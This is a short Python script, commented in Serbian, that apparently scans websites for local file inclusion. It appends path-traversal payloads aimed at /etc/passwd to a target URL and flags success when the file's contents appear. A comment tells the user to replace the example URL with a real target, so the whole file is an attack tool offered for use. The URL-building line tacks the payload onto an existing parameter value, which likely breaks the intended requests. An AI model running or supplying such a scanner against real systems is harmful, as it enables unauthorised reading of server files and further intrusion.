import requests

TARGETS = [
    "http://example.com/index.php?page=home",  # Izmeni na pravu metu
]

LFI_PAYLOADS = [
    "../../../../../../../../etc/passwd",
    "../../etc/passwd",
    "/etc/passwd",
]

def run_lfi_scan():
    for target in TARGETS:
        for payload in LFI_PAYLOADS:
            test_url = f"{target}{payload}"
            print(f"[+] Testiram: {test_url}")
            try:
                response = requests.get(test_url)
                if "root:x:" in response.text:
                    print("[!] Pronađena LFI ranjivost!")
                    print(test_url)
                    return
            except Exception as e:
                print(f"[X] Greška: {e}")

    print("[-] LFI test završen, ništa nije pronađeno.")

if __name__ == "__main__":
    run_lfi_scan()
